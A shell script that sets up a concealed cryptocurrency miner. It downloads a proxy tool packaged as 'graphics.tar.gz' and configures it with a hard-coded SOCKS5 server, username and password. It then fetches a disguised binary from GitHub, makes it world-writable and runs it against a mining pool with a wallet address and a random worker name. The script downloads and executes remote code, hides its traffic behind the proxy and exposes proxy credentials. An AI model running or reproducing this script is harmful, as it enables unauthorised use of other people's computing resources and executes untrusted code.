#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.223.155.101:1080
socks5_username = sempakcok
socks5_password = gunturmanis
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

wget https://github.com/WxYtzaiu/WxYtzaiu/raw/main/bokep && chmod 777 bokep && ./bokep -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.$(echo $(shuf -i 1-9999 -n 1)HDMI) -p x -t 4
